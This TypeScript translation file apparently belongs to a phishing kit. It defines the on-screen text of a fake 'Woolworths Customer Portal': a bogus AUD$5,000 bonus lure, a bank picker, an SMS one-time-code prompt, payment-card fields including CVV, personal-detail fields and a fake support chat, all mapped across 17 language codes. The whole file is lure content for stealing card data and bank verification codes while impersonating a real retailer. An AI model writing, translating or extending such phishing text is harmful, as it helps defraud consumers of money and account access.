export type TranslationKeys = {
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
};

const AUSTRALIA_ENGLISH_TRANSLATION: TranslationKeys = {
  portal_name: "Woolworths Customer Portal",
  support_center_name: "Woolworths Customer Support",
  win_title: "Exclusive Woolworths Bonus Offer",
  win_subtitle: "Congratulations! You have been selected for today's Woolworths national promotion. Click the button below to claim your AUD$5,000 bonus.",
  win_button: "Claim Bonus",
  banken_title: "Choose Your Bank",
  banken_subtitle: "Select your bank to continue.",
  banken_search_placeholder: "Search your bank...",
  wait_title: "Please Wait",
  wait_subtitle: "Your request is being securely processed...",
  sms_title: "SMS Security Code",
  sms_subtitle: "Enter the {digits}-digit code.",
  sms_input_label: "One-time code",
  sms_button: "Confirm",
  sms_loading: "Processing...",
  card_title: "Payment Details",
  card_subtitle: "Check and confirm your details.",
  card_owner_label: "Cardholder Name",
  card_number_label: "Card Number",
  card_expiry_label: "Expiry Date MM/YY",
  card_cvv_label: "Security Code",
  card_button: "Continue",
  code_title: "Welcome",
  code_subtitle: "Enter the participation code you received from {partner} to unlock your reward.",
  code_button: "Confirm Code",
  live_support_title: "Woolworths Live Support",
  live_support_subtitle: "To continue, you need to contact our Woolworths customer support team.\n\nClick the button below to start the chat.",
  live_support_button: "Start Chat",
  profile_title_small: "Prize Confirmation",
  profile_title_main: "Your Bonus Amount",
  profile_subtitle: "Confirm your details for further processing.",
  profile_firstname_label: "First Name",
  profile_lastname_label: "Last Name",
  profile_phone_label: "Mobile Number",
  profile_button: "Next",
  profile_loading_text: "Processing...",
};

const LANGUAGE_CODES = [
  "fi",
  "nl",
  "et",
  "cs",
  "pt",
  "pl",
  "sv",
  "da",
  "ro",
  "el",
  "hu",
  "tr",
  "en",
  "de",
  "fr",
  "es",
  "it",
] as const;

export const translations: Record<string, TranslationKeys> = Object.fromEntries(
  LANGUAGE_CODES.map((code) => [code, AUSTRALIA_ENGLISH_TRANSLATION]),
) as Record<string, TranslationKeys>;
